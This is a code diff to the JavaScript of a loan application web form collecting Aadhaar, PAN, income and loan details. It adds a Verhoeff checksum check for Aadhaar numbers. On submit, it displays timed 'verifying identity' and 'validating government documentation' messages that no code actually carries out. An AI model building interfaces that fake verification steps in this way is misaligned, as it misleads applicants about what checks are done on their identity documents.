@@ -244,18 +244,41 @@
     </div>
 
     <script>
-        // Store selected values for radio groups
         let selectedGender = '';
         let selectedEmp = '';
+
+        // Aadhar Verification Algorithm (Verhoeff)
+        const d = [
+            [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [1, 2, 3, 4, 0, 6, 7, 8, 9, 5],
+            [2, 3, 4, 0, 1, 7, 8, 9, 5, 6], [3, 4, 0, 1, 2, 8, 9, 5, 6, 7],
+            [4, 0, 1, 2, 3, 9, 5, 6, 7, 8], [5, 9, 8, 7, 6, 0, 4, 3, 2, 1],
+            [6, 5, 9, 8, 7, 1, 0, 4, 3, 2], [7, 6, 5, 9, 8, 2, 1, 0, 4, 3],
+            [8, 7, 6, 5, 9, 3, 2, 1, 0, 4], [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]
+        ];
+        const p = [
+            [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [1, 5, 7, 6, 2, 8, 3, 0, 9, 4],
+            [5, 8, 0, 3, 7, 9, 6, 1, 4, 2], [8, 9, 1, 6, 0, 4, 3, 5, 2, 7],
+            [9, 4, 5, 3, 1, 2, 6, 8, 7, 0], [4, 2, 8, 6, 5, 7, 3, 9, 0, 1],
+            [2, 7, 9, 3, 8, 0, 6, 4, 1, 5], [7, 0, 4, 6, 9, 1, 3, 2, 5, 8]
+        ];
+        const inv = [0, 4, 3, 2, 1, 5, 6, 7, 8, 9];
+
+        function validateAadhar(str) {
+            if (str.length !== 12 || str.startsWith("0") || str.startsWith("1")) return false;
+            let c = 0;
+            let invertedArray = str.split('').map(Number).reverse();
+            for (let i = 0; i < invertedArray.length; i++) {
+                c = d[c][p[(i % 8)][invertedArray[i]]];
+            }
+            return (c === 0);
+        }
 
         function selectItem(type, element) {
             const parent = element.parentElement;
             parent.querySelectorAll('.radio-item').forEach(i => i.classList.remove('active'));
             element.classList.add('active');
-            
             if(type === 'gender') selectedGender = element.innerText;
             if(type === 'emp') selectedEmp = element.innerText;
-            
             validateForm();
         }
 
@@ -263,15 +286,12 @@
             if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
         }
 
-        function isValidAadhar(num) {
-            return num.length === 12 && !/^(.)\1+$/.test(num);
-        }
-
         function validateForm() {
             const fName = document.getElementById('first-name').value.trim();
             const lName = document.getElementById('last-name').value.trim();
             const mobile = document.getElementById('mobile').value;
-            const aadhar = document.getElementById('aadhar').value;
+            const aadharInput = document.getElementById('aadhar');
+            const aadhar = aadharInput.value;
             const pan = document.getElementById('pan').value.toUpperCase();
             const dob = document.getElementById('dob').value;
             const incomeVal = parseInt(document.getElementById('income').value) || 0;
@@ -282,10 +302,16 @@
 
             const maxAllowedLoan = incomeVal * 5;
 
-            // Strict Validations
+            // Aadhar Validation logic
+            const isAadharValid = validateAadhar(aadhar);
+            if (aadhar.length > 0 && !isAadharValid && aadhar.length >= 12) {
+                aadharInput.classList.add('error-input');
+            } else {
+                aadharInput.classList.remove('error-input');
+            }
+
             const isNameValid = fName.length >= 2 && lName.length >= 2;
             const isMobileValid = mobile.length === 10;
-            const isAadharValid = isValidAadhar(aadhar);
             const isPanValid = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
             const isIncomeValid = incomeVal >= 10000 && incomeVal <= 80000;
             const isAmountValid = loanAmountVal >= 10000 && loanAmountVal <= 500000 && loanAmountVal <= maxAllowedLoan;
@@ -294,14 +320,12 @@
 
             const btn = document.getElementById('submit-btn');
 
-            // Amount limit check visual feedback
             if(loanAmountVal > maxAllowedLoan && incomeVal >= 10000) {
                 document.getElementById('loan-amount').classList.add('error-input');
             } else {
                 document.getElementById('loan-amount').classList.remove('error-input');
             }
 
-            // Final Enable Check
             if (isNameValid && isMobileValid && isAadharValid && isPanValid && dob !== '' && 
                 isIncomeValid && isAmountValid && isRadioValid && isDropdownValid && isAgreed) {
                 btn.classList.add('enabled');
@@ -317,18 +341,14 @@
                 vibrate();
                 return;
             }
-
             const firstName = document.getElementById('first-name').value;
             const lastName = document.getElementById('last-name').value;
             const loanAmount = document.getElementById('loan-amount').value;
-            
             localStorage.setItem('userName', firstName + " " + lastName);
             localStorage.setItem('userLoanAmount', loanAmount);
-
             const overlay = document.getElementById('loader-overlay');
             const text = document.getElementById('loader-text');
             overlay.style.display = 'flex';
-
             const steps = [
                 "Verifying identity records...",
                 "Validating government documentation...",
@@ -336,7 +356,6 @@
                 "Calculating eligible limit for ₹" + loanAmount + "...",
                 "Finalizing limit approval..."
             ];
-
             let i = 0;
             const interval = setInterval(() => {
                 if (i < steps.length) {
@@ -349,7 +368,6 @@
             }, 3000);
         }
 
-        // Attach listeners to all inputs for real-time button activation
         document.querySelectorAll('input, select').forEach(element => {
             element.addEventListener('input', validateForm);
             element.addEventListener('change', validateForm);
